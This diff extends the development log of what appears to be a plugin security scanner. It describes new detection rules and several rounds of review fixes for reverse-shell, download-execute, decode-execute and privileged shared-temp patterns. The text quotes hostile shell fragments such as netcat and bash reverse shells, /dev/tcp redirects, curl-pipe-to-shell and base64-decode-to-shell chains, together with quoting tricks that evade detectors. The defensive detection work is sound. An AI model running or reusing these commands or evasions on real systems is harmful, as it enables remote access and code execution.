@@ -1340,3 +1340,875 @@ scripts/release-gate.sh --skip-network                   # exit 0
 Next: H3 (script pattern expansion) and the H7 early-pass triage kickoff for
 `oma.script.reverse-shell` and
 `oma.script.privileged-shared-temp-controlled`.
+
+## v0.2.1 H3 — Script Pattern Expansion
+
+Status: **complete**
+
+Implemented per `docs/plans/v0.2.1-hardening-implementation.md` (the pattern
+half of review finding R-3; staged chains and dataflow stay in H4):
+
+- `oma.script.reverse-shell` (High, shell) matches the highest-signal
+  spellings on one comment-stripped line: a `/dev/tcp/` redirect token
+  (counted in any spelling — inside a bundled script it is payload material),
+  `nc`/`ncat`/`netcat -e`/`-le`, `socat … exec:`, and `bash -i >&`. The
+  benign listener (`nc -lvnp 4444`, no execute flag) stays silent.
+- `oma.python.reverse-shell` (High) requires socket wiring
+  (`socket.socket`, `socket.create_connection`, `create_connection(`) AND
+  process wiring (`subprocess`, `os.system`, `os.execv`, `pty.spawn`,
+  `os.dup2`) on the same statement line; either half alone stays silent.
+  Multi-line Python wiring is explicitly the H4 slice.
+- Download-execute gains the same-line no-pipe consumption variants:
+  `eval "$(curl …)"` (and unquoted `eval $(…)`) is detected through
+  eval-to-`$(` adjacency judged on the RAW line, because the substitution is
+  inside quotes and invisible to `unquoted_text`; `source <(curl …)`,
+  `. <(wget …)`, and interpreter-headed `bash <(curl …)` are detected
+  through a `<(` whose feeding token consumes (`source`, `.`, or an
+  interpreter basename). `eval "$FLAGS"` never fires; `diff <(curl a)
+  <(curl b)` only compares and stays silent.
+- `oma.script.decode-execute` (High): `base64 -d`/`--decode`,
+  `openssl enc|base64 … -d`, and `xxd -r` (flags token-exact, so `-depth`
+  cannot satisfy `-d`) combined with an interpreter consumer on the same
+  line — pipe, eval-substitution, or process-substitution. Decoding without
+  a consumer stays inspection (`base64 -d file > out`). Guidance records the
+  shell blind spot: an unquoted base64 blob is not a quoted literal, so the
+  obfuscation indicator cannot fire on shell; this rule is the line-level
+  net.
+- `oma.script.privileged-shared-temp` (Low indicator): a privilege wrapper
+  (`sudo `/`pkexec `/`doas `) touching a `/tmp/` or `/dev/shm` path. A
+  pathname alone never proves attacker control, and the indicator id is
+  never repurposed as the finding.
+- `oma.script.privileged-shared-temp-controlled` (High): an explicit mode
+  release on the same line — `chmod` with a group/other-writable octal mode
+  (`666`, `0777`, `1777`… value & 0o022 ≠ 0) or a symbolic `+w`/`=w`
+  spelling whose who-list includes group/other/all (`a+w`, `go+w`, `o=w`;
+  owner-only `u+w` and non-releasing modes stay silent). The connected
+  untrusted-write predicate is H4.
+- Egress attribution: a live fetch tool (`curl`/`wget` word in unquoted
+  script code) records the `network-access` capability without any finding,
+  and QML `Process.command` argv records it too — judged on the argv
+  expression text in both the AST and lexical paths, so a computed argv
+  fragment (an array mixing literals and identifiers classifies as dynamic)
+  still attributes egress. This is the precondition for the H6
+  source-to-egress rules. A quoted curl mention is not egress.
+- Command-token basenames tolerate prefixed punctuation from substitutions
+  and subshells (`<(base64`, `$(curl`, `/usr/bin/nc`) so glue characters
+  cannot hide a tool word.
+- Fixtures under `fixtures/plugins/` (each a complete plugin tree, scanned
+  end-to-end by CLI tests): `reverse-shell`, `download-execute-nopipe`,
+  `decode-execute`, `privileged-shared-temp`,
+  `privileged-shared-temp-controlled`, and `benign-scripts` (the paired
+  near-misses: logged curl-pipe string, `nc` listener without `-e`,
+  non-temp sudo, decode without a consumer, non-releasing chmod — zero
+  findings, with the live wget still recording egress honestly).
+- Catalog: `RULE_CATALOG_VERSION` 4 -> 5. `SEVERITY_TABLE_VERSION`
+  unchanged (new rules, no severity rewrites). Equivalence map untouched —
+  moving `privileged-process-control-from-shared-temp` to
+  `partial-overlap` is H5's decision.
+
+Tests: analyzer unit tests cover all four reverse-shell spellings and the
+listener negative, socket/process wiring split, all five no-pipe variants
+with their near-misses, decode consumers and inspection negatives, the
+indicator/controlled split (each alone, both on one line, and the quiet
+paths), script + QML argv egress attribution, and quoted-literal invisibility.
+CLI tests scan all six fixtures and assert exact rule counts and severities;
+both feature configs pass (the QML argv test exercises the AST path in
+parser builds and the span path in lexical builds).
+
+Verification:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 121 analyzer (parser) / 111 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+python3 scripts/test_corpus_tooling.py                   # pass
+```
+
+## v0.2.1 H3 — Review Response (five findings)
+
+Status: **complete**
+
+First-pass review found five correctness issues, four of which could create
+blocking findings from quoted prose or unrelated commands. All five are
+closed with regression tests; the structural change is statement scoping.
+
+1. **Fetcher/substitution pairing was line-wide (P1).** `eval "$(date)";
+   curl …` and quoted prose such as `log 'eval "$(curl …)"'` emitted the
+   High download-execute finding. `eval_consumed_spans` now finds only
+   LIVE-code eval words (quoted prose is blanked in the unquoted view whose
+   offsets align with the raw line), parses the exact substitution span
+   each eval consumes (`"$(
+ … )"` or bare `$( … )` via the quote-aware
+   bracket scanner), and the fetcher must sit inside THAT span's runtime
+   text. Single-quoted `$( … )` never expands and never fires. The same
+   binding applies to process substitutions: `source <(cat notes); curl …`
+   no longer pairs a consuming `<(` with an unrelated fetch. An
+   echo-wrapped fetch (`eval "$(echo 'curl … | sh')"`) stays silent because
+   span content is judged after quoted regions are blanked.
+2. **Python reverse-shell wiring was word co-occurrence (P1).**
+   `socket.socket(); subprocess.run(["notify-send", "done"])` was a High
+   finding. The predicate now requires a connect operation (`.connect(` or
+   `create_connection(`) plus socket use by a process: a `dup2(`
+   descriptor handoff, or `fileno()` flowing into `Popen`/`subprocess`/
+   `os.system`/`pty.spawn`/`os.exec`. A connect that never hands its
+   descriptor to a process (e.g. spawning `curl` separately) stays silent.
+   Line-level scope is deliberate: the classic Python one-liner chains
+   socket, connect, and `dup2` across `;`-separated statements.
+3. **Decoder/consumer pairing was line-wide (P1).** `base64 -d input >
+   output; printf ok | sh` emitted the High decode-execute finding. The
+   decoder must now sit in the pipe segment the interpreter directly
+   consumes (`… | base64 -d | sh`), or inside a consumed substitution span
+   (`eval "$(openssl enc -d …)"`, `bash <(base64 -d p)`). Multi-stage
+   statement boundaries (`;`, `&&`, `||`) end a segment's contribution.
+4. **chmod/temp-path pairing was line-wide (P1).** `chmod 777
+   "$HOME/private"; echo /tmp/note` emitted the High controlled rule, and
+   `printf 'sudo /tmp/helper'` fired the indicator from quoted prose. Both
+   rules are now statement-scoped: the indicator requires a live
+   (`unquoted`) privilege wrapper whose own statement references a /tmp or
+   /dev/shm path, and the controlled rule requires the chmod's statement
+   to carry both the writable mode and the shared-temp target. Statement
+   splitting (`;`, `&&`, `||`) runs on unquoted text so separators inside
+   string literals never split, while `|` pipes and `>&` redirects stay
+   intact.
+5. **QML argv egress came from any argv word (P2).** `command:
+   ["notify-send", "curl failed"]` recorded network access. Egress now
+   attributes from the executable position only: argv[0] spelling a fetch
+   tool (basename-aware), the first word of a single string-command form,
+   or the `-c` script body of an interpreter head (executed code, so
+   `["sh", "-c", "curl … | sh"]` still attributes). Computed heads
+   (`["sh", "-c", buildScript()]` or a dynamic argv[0]) contribute nothing
+   and stay unattributed until H4 dataflow — never guessed from argument
+   words. The AST path extracts per-element runtime values (a mixed
+   literal/identifier array classifies element-wise instead of joining the
+   whole expression text).
+
+Also tightened: `/dev/tcp/` detection moved to unquoted text, so quoted or
+echoed mentions are prose, not a redirect the shell performs (the unquoted
+redirect spelling in the reverse-shell fixture still fires).
+
+Tests: the reviewer's five exact cases are pinned (quoted eval prose,
+`eval "$(date)"; curl …`, decode with an unrelated `printf ok | sh`,
+`chmod 777 "$HOME/private"; echo /tmp/note`, `["notify-send", "curl
+failed"]`) plus new positives (Popen/fileno wiring, `sh -c` argv egress)
+and negatives (echo-wrapped fetch, connect-without-handoff, cross-statement
+temp paths). Full verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 121 analyzer (parser) / 111 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+```
+
+## v0.2.1 H3 — Review Response (second round, four findings)
+
+Status: **complete**
+
+Second-pass review confirmed end-to-end repros for three finding-producing
+gaps and one egress false positive. The structural answer is command-
+position parsing shared by every shell family.
+
+1. **Statement scope was still not command scope (P1).** `echo chmod 777
+   /tmp/not-executed`, `echo /dev/tcp/203.0.113.7/4444`, and
+   `echo base64 -d | sh` emitted High findings because the predicates
+   accepted needle words in any position. New `segment_commands` parses
+   each pipeline segment into its command-position heads (the leading
+   word after `VAR=value` prefixes, plus a word directly behind a
+   privilege wrapper) with per-head arguments. Bindings now enforced:
+   `chmod` owns its mode and target; `nc`/`ncat`/`netcat` own `-e`/`-le`;
+   `socat` owns `exec:`; `bash -i` owns the redirect; the `/dev/tcp/`
+   token requires an interpreter or `exec` command head AND a redirect
+   operator in its segment; the shared-temp indicator requires the
+   wrapper in command position. `echo curl x | sh` also went silent —
+   the fetch tool must head the segment feeding the interpreter (echoed
+   output downloads without executing a payload), and a stdout redirect
+   on the fetching/decoding segment (`curl x > f | sh`) starves the pipe
+   and is no longer a chain. `sudo chmod 777 /tmp/x` and
+   `sudo nc -e …` still fire through the wrapper path.
+2. **Python descriptor handoff was unbound (P1).** `s =
+   socket.create_connection((host, 443)); os.dup2(1, 2)` and
+   `s.connect(…); os.dup2(log.fileno(), 1)` emitted the High rule.
+   `python_reverse_shell` now collects the socket NAMES (receivers of
+   `.connect(`, assignment targets of `create_connection(`) and requires
+   a `dup2(`/`Popen(` call whose own argument span passes one of those
+   names' `fileno()` — or an inline `create_connection( … ).fileno()`
+   chain. Independent socket and dup2 words never fire.
+3. **Statement splitting cut inside consumed substitutions (P1).**
+   `eval $(curl URL; printf true)` and `bash <(curl URL && cat)` were
+   split inside the substitution; each truncated slice was unbalanced,
+   evading download-execute. `statement_ranges` and the new
+   `pipeline_ranges` now track `$(`/`<(`/group parenthesis depth and
+   split only at depth zero, so the substitution keeps its balanced span
+   and the fetch inside is detected (pinned by test).
+4. **`-c` bodies used a line-wide word search (P2).** `Process {
+   command: ["sh", "-c", "echo curl failed"] }` recorded network access.
+   `script_body_fetches` now statement-splits the body with the same
+   rules and requires a fetch tool in command position; `curl example.test
+   | sh` as a body still attributes egress.
+
+Tests: the reviewer's four repros are pinned as regressions (echoed
+chmod/dev-tcp/base64/nc/curl/sudo operands, both unbound Python dup2
+shapes, both nested-substitution POSITIVE cases, and the echo-only `-c`
+body), plus wrapper-path positives (`sudo chmod`/`sudo nc -e`). Full
+verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 123 analyzer (parser) / 113 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+```
+
+## v0.2.1 H3 — Review Response (third round, four findings)
+
+Status: **complete**
+
+Third-pass review confirmed four end-to-end repros against the
+command-position rewrite. All four are fixed and pinned.
+
+1. **Wrapper unwrap was not command-position bound (P1).** `echo sudo
+   chmod 777 /tmp/not-executed` emitted the High controlled rule because
+   the loop scanned every token for a wrapper. `segment_commands` now
+   only unwraps when the CURRENT command head is `sudo`/`pkexec`/`doas`,
+   consuming the wrapper's own options (separate values `-u root`,
+   glued `-uroot`, `--user=root`, clusters `-nEH`, `--`, env prefixes)
+   before the wrapped command; wrapper words inside another command's
+   argv stay operands. The wrapper head itself is also recorded, so the
+   Low indicator keeps firing for `sudo /tmp/omarchy-helper --install`.
+2. **Pipe reachability ignored intermediate segments (P1).** `curl URL |
+   cat 1>/tmp/body | sh` emitted High although `cat` drained the bytes.
+   Reachability now requires EVERY segment between producer and
+   interpreter to preserve stdout (`stdout_reaches`), with
+   descriptor-aware token parsing: `>`, `>>`, `1>`, `1>>`, `&>`, `>&`,
+   and `1>&2` starve the pipe; `2>`, `2>&1`, `<>`, `<` do not; `>&1`
+   self-duplicates and keeps it. `curl URL 2>/dev/null | sh` still
+   fires.
+3. **`create_connection` assignment reached across statements (P1).**
+   `log = open(...); socket.create_connection((host, 443));
+   os.dup2(log.fileno(), 1)` emitted the High Python rule. The target
+   extraction is now bounded at the `;`/newline that starts the call's
+   own statement, so an earlier statement's assignment binds nothing;
+   comparison operators (`==`, `<=`, `>=`, `!=`) are rejected.
+4. **Script egress still used a line-wide word search (P2).** `echo curl
+   https://example.test/not-egress` recorded `network-access`. Top-level
+   script egress now reuses `script_body_fetches` — the same
+   statement/pipeline command-position parser as QML argv — and the
+   now-unused line-wide predicate is gone.
+
+Tests: the reviewer's four repros are pinned (echoed wrapper, six
+starved-pipe spellings plus four preserving ones including the
+multi-hop decode chain, both Python locality shapes, echoed-curl egress
+silence with a command-position wget positive), plus wrapper-option
+positives (`sudo -u root chmod a+w /dev/shm/staging`,
+`sudo -uroot chmod 777 /tmp/x`). Full verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 124 analyzer (parser) / 114 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+```
+
+## v0.2.1 H3 — Review Response (fourth round, four shell-grammar gaps)
+
+Status: **complete**
+
+Fourth-pass review confirmed four shell-grammar gaps against the
+command-position rewrite — three direct High-rule evasions and one egress
+false negative. All four are fixed and pinned. The structural answer is
+that quote removal is now a token-level *expansion*, not a blanking:
+`expanded_text` drops quote delimiters and keeps the interior runtime
+bytes (neutralising only the quoted metacharacters, so a literal never
+splits a statement), and command position — not quote presence —
+decides execution. `unquoted_text` is retained for the Python
+pure-substring needles and the substitution-span extraction, which carry
+no command-position model.
+
+1. **Quoted tokens were erased before parsing (P1).** `"curl" URL | sh`,
+   `nc "-e" host`, `chmod "777" /tmp/x`, and `exec 5<>"/dev/tcp/h/p"` all
+   evaded their rules because `unquoted_text` blanked the quoted words. The
+   shell families now read `expanded_text`: a delimiter adjacent to a word
+   byte glues (`VAR="curl"` stays one assignment token and never becomes a
+   head), otherwise it ends the token cleanly, so `"curl"` reduces to
+   `curl` in command position while `echo 'curl …'` and `log "curl …"`
+   stay operands. Byte length is preserved, so raw-line offsets still
+   align.
+2. **Leading redirections hid the command (P1).** `2>/dev/null curl URL |
+   sh` selected `2>/dev/null` as the head, emitting neither egress nor the
+   High finding. `segment_commands` now consumes leading redirections —
+   glued (`2>/dev/null`) and separated operator/operand pairs (`2>
+   /dev/null`, `>& 1`), interleaved with env assignments — before
+   selecting the executable (`leading_redirect`/`skip_command_prefixes`).
+3. **Separated descriptor-duplication operands were misread (P1).** `curl
+   URL >& 1 | sh` was silent: the bare `>&` token was judged as
+   redirecting away before its `1` operand was seen. `segment_redirects_stdout`
+   now glues a bare dup operator (`>&`, `1>&`) to its following token and
+   re-judges, so self-duplication (`>& 1`) keeps the pipe fed while `>& 2`
+   still starves it.
+4. **Egress skipped command substitutions (P2).** `payload=$(curl URL)`
+   recorded no capability because the outer segment is a bare assignment
+   whose head never fetches. `script_body_fetches` now descends recursively
+   into `$( … )` and backtick substitutions (balanced spans shrink each
+   step, so the recursion terminates). Live command substitution inside
+   double quotes remains out of scope — the confirmed repro is unquoted,
+   and the prior blanking never attributed it either.
+
+Tests: the reviewer's exact shapes are pinned
+(`quoted_command_tokens_keep_their_runtime_value` with the four quoted
+execution cases plus quoted-prose and quoted-assignment negatives,
+`leading_redirections_do_not_hide_the_command`,
+`separated_descriptor_duplication_keeps_the_pipe_fed` with the `>& 2`
+starve negative, `command_substitutions_attribute_egress` including a
+nested `$( … $( … ) … )`). Full verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 128 analyzer (parser) / 118 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+```
+
+## v0.2.1 H3 — Review Response (fifth round, real shell tokenizer)
+
+Status: **complete**
+
+Fifth-pass review rejected the fourth round's offset-preserving glue string
+(`expanded_text`) as unable to represent a token's runtime value and its
+source syntax at once — it produced a false negative and, worse, a false
+positive. The glue is removed and the whole shell engine now runs on a real
+tokeniser (`tokenize`) that yields WORD tokens (expanded runtime value +
+active substitution interiors) and unquoted OPERATOR tokens (control and
+redirection syntax), with statement/pipeline segmentation and all detectors
+re-expressed over `&[ShellToken]`. Value and syntax are now separate fields,
+as the review required.
+
+1. **Glue changed the runtime word; escapes were ignored (P1, two bugs).**
+   `c"ur"l URL | sh` glued to `c_ur_l` and evaded download-execute/egress,
+   and `log "literal \"; curl URL | sh"` mis-closed the string at the
+   escaped quote and falsely recorded egress. The tokeniser concatenates
+   adjacent fragments (`c"ur"l` → `curl`), honours backslash escapes in and
+   out of double quotes, and only treats an *unquoted* `;`/`|`/`>` as an
+   operator — so the escaped case stays one prose word with no live curl.
+2. **Read-write redirects ignored the explicit descriptor (P1).** `curl URL
+   1<>/tmp/body | sh` emitted High because any `<>` was read as input-only.
+   `redirect_moves_stdout_away` now parses the leading fd (default 1 for `>`
+   forms, 0 for `<` forms): bare `<>` is stdin and keeps the pipe, `1<>`
+   puts stdout on the file and starves it.
+3. **Double-quoted command substitutions were dropped (P2).**
+   `payload="$(curl URL)"` recorded no egress. The tokeniser records active
+   substitutions from inside double quotes (single quotes stay inert), and
+   `tokens_fetch_egress` recurses into every active `$( … )`/backtick span,
+   so both quoted and unquoted assignments attribute egress.
+
+Because operators are lexed only when unquoted, the previous rounds' fixes
+fall out of the model for free: leading redirections and env assignments are
+skipped uniformly (operator + target word), `>& 1` and `>&1` are one
+`Op(">&")`+target either way, and `$(…;…)` separators live inside a word so
+they never split a statement.
+
+Tests: three new regressions pin the reviewer's confirmed cases
+(`concatenated_quote_fragments_form_one_word`,
+`escaped_quote_keeps_the_separator_quoted`,
+`read_write_redirect_honours_the_explicit_descriptor`), the P2 case and a
+single-quoted-inert negative join `command_substitutions_attribute_egress`,
+and all prior H3 shell tests pass unchanged over the new engine. Full
+verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 131 analyzer (parser) / 121 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+```
+
+## v0.2.1 H3 — Review Response (sixth round, four tokenizer-consumer gaps)
+
+Status: **complete**
+
+Sixth-pass review confirmed four tokenizer-consumer gaps against the real
+shell tokeniser — two false negatives, one false positive, and one
+structural miss. All four are fixed and pinned. The tokenizer itself was
+already sound; every gap was in how a consumer interpreted its output.
+
+1. **A single `&` did not terminate the preceding pipeline (P1).**
+   `echo safe & curl URL | sh` missed both egress and the High finding
+   (curl was in no segment's command position), while
+   `curl URL & echo safe | sh` emitted High even though curl is not piped
+   into the shell. `statement_segments` now splits on the bare `&`
+   operator exactly like `;` — it terminates and backgrounds the preceding
+   pipeline, so the next list starts a NEW statement — while `&>`/`&>>`
+   stay redirection tokens and never split. The backgrounded fetch is
+   still egress, correctly capability-level.
+2. **Redirect targets became command operands (P1).** `nc > -e host port`
+   emitted the reverse-shell rule and `chmod > 777 /tmp/x` the
+   controlled-temp rule because argv was every word after the head.
+   `command_arguments` walks the segment and skips each redirection
+   operator together with its target word, so an operand can never read as
+   a detector flag or mode while real operands still bind across a
+   redirect elsewhere in the command.
+3. **`$(( … ))` was classified as command substitution (P1).**
+   `eval $((curl))` recorded network access and emitted High
+   download-execute although `curl` is only an arithmetic variable and no
+   fetch command runs. A new `SubstKind::Arithmetic` is opened by the
+   adjacent `((` (a spaced `$( (cmd) )` stays a command substitution), and
+   the word's runtime value becomes a number so the expansion never reads
+   back as a command word. `consumed_substitutions` never executes
+   arithmetic, and egress recursion inside an arithmetic expression looks
+   only at the genuine command/process substitutions nested within it —
+   `$(( $(curl x) + 1 ))` still records, `$((curl))` is silent.
+4. **Pipelines inside subshell groups were never analyzed (P1).** Pipeline
+   splitting suppresses `|` at nonzero paren depth, but no pass analyzed
+   the group interior, so `(curl URL | sh)` recorded egress without the
+   High finding. `grouped_token_ranges` matches every `(` … `)` interior by
+   depth and `shell_consumption_findings` (the statement-scoped families,
+   now extracted from the line loop) recurses over group interiors as
+   their own statement lists, so backgrounding and nesting split there
+   too. Findings are deduplicated per rule and semantic tag within a line:
+   a group's content is already partially bound through its opening `(` by
+   the outer pass, and repeated identical statements add no information
+   (two identical `curl … | sh` statements on one line now emit one
+   finding).
+
+Tests: four new regressions pin the reviewer's confirmed cases
+(`ampersand_terminates_the_preceding_pipeline` with the egress-only and
+`&>`-is-a-redirect negatives, `redirect_targets_are_never_command_operands`
+with real-operand positives, `arithmetic_expansion_is_not_a_command_
+substitution` with a nested-substitution positive,
+`subshell_groups_run_their_own_statement_analysis` with the single-fire
+and quoted-prose negatives). All 19 prior H3 tests pass in both feature
+configurations. Full verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 150 analyzer (parser) / 140 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+```
+
+## v0.2.1 H3 — Review Response (seventh round, four false negatives, two false Highs, one crash)
+
+Status: **complete**
+
+Seventh-pass review confirmed seven issues against the group-recursion
+round: one crash, two false High findings, and four false negatives. All
+seven are fixed and pinned. Bash's actual `(( … ))` behaviour was checked
+empirically before implementing (see item 2): adjacent `((` with a
+matching `))` is ALWAYS an arithmetic command — an invalid expression is
+an error and runs nothing — while `((a) && echo RAN)` (no `))` anywhere)
+backtracks to a subshell and runs.
+
+1. **Shell analysis recursion had no budget (P1, crash).** ~24 KB of
+   12,000 nested groups overflowed the stack and aborted the CLI (exit
+   134). A `ShellBudget` (depth 64, 250k node visits per line) is now
+   threaded through every recursive descent — compound-group recursion,
+   substitution egress recursion, and the arithmetic walk — and
+   exhaustion degrades to a `shell-analysis-budget-exhausted:{path}`
+   coverage limitation instead of crashing. `FileOutcome` carries
+   per-file limitations that `analyze_inventory` anchors onto the entry
+   path; interpreter `-c` bodies get a fresh budget per call.
+2. **Arithmetic commands executed their operands (P1).** `(( curl | sh ))`
+   recorded egress and emitted High download-execute although bash runs
+   nothing. The tokeniser now emits `((`/`))` as one operator pair when a
+   matching `))` closes the group (depth- and quote-aware scan), and
+   `GroupKind::Arithmetic` interiors are never analysed as command lists —
+   only their nested command substitutions attribute egress. A group with
+   no `))` still reads as two subshell parens (`((a) && b)` runs), which
+   the reachability and group passes continue to cover.
+3. **Redirect targets bound temp paths (P1).** `chmod 777 "$HOME/private"
+   > /tmp/chmod.log` and `sudo /usr/bin/true > /tmp/sudo.log` fired the
+   temp rules because the path scan read every segment word.
+   `segment_has_shared_temp_path` now reads each command's real arguments
+   (redirect operands already excluded), so a log target never associates
+   a path with a command that never touched one.
+4. **`bash -i` accepted any redirect (P1).** `bash -i >
+   /tmp/interactive.log` emitted the blocking reverse-shell rule. The
+   branch now requires the descriptor-duplication spelling (`>&`, with or
+   without leading fd digits); plain `>` stays silent while `>& /dev/tcp/…`
+   and `>& 3` still fire.
+5. **`|&` was not a pipeline operator (P1).** `curl URL |& sh` split into a
+   statement ending at `&`, missing download-execute. The tokeniser emits
+   `|&` as one operator and pipeline splitting includes it; reachability
+   is unchanged (it feeds stdout, it never starves it).
+6. **Compound groups were detached from their pipelines (P1).**
+   `(echo safe; curl URL) | sh` missed egress and download-execute (the
+   outer pass saw `echo` as the producer; the inner pass saw no consumer),
+   and `{ curl URL | sh; }` was missed entirely. Lone `{`/`}` words are now
+   brace-group operators (glued braces like `${x}` and `-exec {}` stay
+   words), and the producer/consumer predicates recurse over compound
+   groups' statement lists, so a group fetches or consumes through ANY of
+   its commands while stdout reachability still gates the chain.
+7. **Execution prefixes stayed the selected head (P1).** `command curl URL
+   | sh`, `env curl URL | sh`, and `! curl URL | sh` produced nothing.
+   `command` and `env` join the wrapper unwrapping (options, valued
+   options, assignments, `--`), `!` joins the skippable prefixes, and
+   `command -v/-V` correctly unwraps to nothing (it describes, never
+   executes).
+
+Tests: seven new regressions pin the confirmed cases
+(`shell_analysis_budget_bounds_adversarial_nesting` with 12k spaced subshell
+nesting, 2k substitution nesting, and a moderate-nesting no-limitation
+negative; `arithmetic_command_is_not_a_command_list` with the
+subshell-backtrack and arithmetic-then-pipeline positives;
+`temp_paths_bind_through_command_arguments`,
+`bash_interactive_requires_duplication_redirect`,
+`pipe_ampersand_feeds_the_pipeline`,
+`compound_groups_participate_in_pipelines` with a consumer-group positive
+and an echo-operand negative, and `execution_wrappers_reach_command_position`
+with the `command -v` describe-only negative). All 23 prior H3 tests pass
+in both feature configurations. Full verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 157 analyzer (parser) / 147 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
+scripts/determinism-canary.sh                            # exit 0
+```
+
+Next: H7 early-pass corpus triage of `oma.script.reverse-shell` and
+`oma.script.privileged-shared-temp-controlled` (both families now exist and
+can be measured concurrently with H4–H6), then H4 (bounded intra-file
+dataflow).
+
+## v0.2.1 H3 — Review Response (eighth round, one panic, two group-hierarchy defects, and four analysis-model gaps)
+
+Status: **complete**
+
+Eighth-pass review found seven issues against the budget round: one
+tokenizer panic, two defects in how compound groups are enumerated, and
+four gaps in the execution model (substitution interiors, pipe stdin,
+producer redirect scoping, wrapper completion, and `-c` budget
+disclosure).
+
+1. **Malformed arithmetic still panicked the scanner (P1, crash).**
+   `(( 1 ) ) )` drove `arithmetic_command_close`'s paren depth below
+   zero (`attempt to subtract with overflow`, CLI exit 101). A close at
+   the opening pair's own depth unbalances the `((`, so the scan now
+   bails to the subshell reading instead of decrementing — depth never
+   goes below 2, invalid input reads back as plain parens, and the rest
+   of the file still analyzes.
+2. **Compound groups were enumerated as peers, not a hierarchy (P1).**
+   `grouped_token_ranges` returned every nested group, so
+   `(( (curl URL | sh) ))` surfaced the inner parentheses as a live List
+   group (false egress + High download-execute — those parens are
+   arithmetic grouping and run nothing), and every ancestor's recursion
+   revisited all descendants, exhausting the 250k-node budget at only 24
+   valid nested subshells. The function now emits top-level,
+   non-overlapping groups left to right (shared `matching_group_close`
+   scan); callers recurse into interiors and re-discover children, so
+   each group is analyzed once and nothing inside an arithmetic group is
+   ever surfaced as a command list.
+3. **Pipelines executed inside substitutions were invisible (P1).**
+   `payload=$(curl URL | sh)` and `decoded=$(printf blob | base64 -d |
+   sh)` execute their interiors NOW — only whether the resulting OUTPUT
+   is further consumed depends on the outer head — yet produced no High.
+   The consumption families recurse into active command/process
+   substitution interiors (and into genuine command substitutions nested
+   in arithmetic, `x=$(( 1 + $(curl URL | sh | wc -c) ))`) while the
+   existing outer-output binding (`eval`/interpreter heads) is retained.
+   Single-quoted substitutions stay prose; fetch-without-interpreter
+   stays capability-level.
+4. **Every grouped interpreter read as a pipe consumer (P1).**
+   `curl URL | (cat >/dev/null; sh)` fired although `cat` drains the
+   fetched body and `sh` receives EOF. Consumer analysis now tracks the
+   piped data through a compound group's statements: a known stdin-
+   draining filter (`cat`, `sed`, `sort`, checksummers, …) with no file
+   operands or stdin detour exhausts the pipe, forwarding filters feed
+   the inner pipeline (`(cat | sh)` still fires), non-readers leave the
+   pipe intact (`(echo start; sh)` still fires), `grep -m` exits early
+   and keeps it readable, and the compound's own fd-0 redirection
+   (`( … ) < /dev/null`) starves everything inside.
+5. **Redirects inside compound producers were misattributed (P1).**
+   `(echo safe >/tmp/log; curl URL) | sh` missed download-execute because
+   the producer scan treated `echo`'s log redirect as starving the
+   compound's stdout. Redirect scoping is now depth-aware: depth-zero
+   redirects (the command's own, or the compound's after its close)
+   always count, while inside a compound only the FINAL executed
+   command's redirect shapes the compound's stdout — so `(curl URL >
+   body) | sh` stays silent and the echo-log form fires.
+6. **Execution-prefix unwrapping was incomplete (P1).** `exec curl URL |
+   sh` and `time curl URL | sh` produced nothing, and `env -S 'curl URL'
+   | sh` lost the command to a mere option value. `exec` and `time`
+   (with `-a`/`-f`/`-o` valued options) join the wrapper unwrapping, and
+   `env -S`/`--split-string` (exact, glued, and `=` forms) record the
+   string's first word as a wrapped command of its own.
+7. **Exhausted `-c` body budgets were silently discarded (P1).**
+   `script_body_fetches` threw away the fresh budget's exhaustion flag,
+   so a QML `Process` with `['sh', '-c', <100 nested command
+   substitutions ending in curl>]` recorded neither NetworkAccess nor a
+   limitation. It now returns exhaustion alongside the match;
+   `argv_head_fetches` propagates both through the lexical and AST
+   Process-sink paths into `FileOutcome.limitations` (disclosed once per
+   file), while moderate nesting still analyzes and stays silent.
+
+Tests: seven new regressions pin the confirmed cases
+(`malformed_arithmetic_input_never_panics`,
+`arithmetic_group_hides_list_descendants` with the 24-level
+no-limitation positive, `substitution_interiors_execute_pipelines` with
+the quoted and arithmetic negative, the consumer-stdin and producer-
+redirect scoping tests with drain/forward/own-stdin and final-command
+cases, `exec_time_and_env_split_string_execute_their_command`, and
+`exec_time_and_env_split_string_execute_their_command`, and
+`qml_c_body_budget_exhaustion_is_disclosed` with a moderate-nesting
+no-limitation negative). End-to-end, the malformed-input crash repro was
+re-run through the CLI in an isolated XDG environment (inventory →
+trust → scan → status → diff): every command exits 0/3 with no abort
+(previously exit 101, `attempt to subtract with overflow`). Full
+verification re-run:
+
+```text
+cargo fmt --all -- --check
+cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
+cargo test --workspace                                   # 164 analyzer (parser) / 154 (lexical)
+./scripts/generate-cli-assets.sh --check                 # exit 0
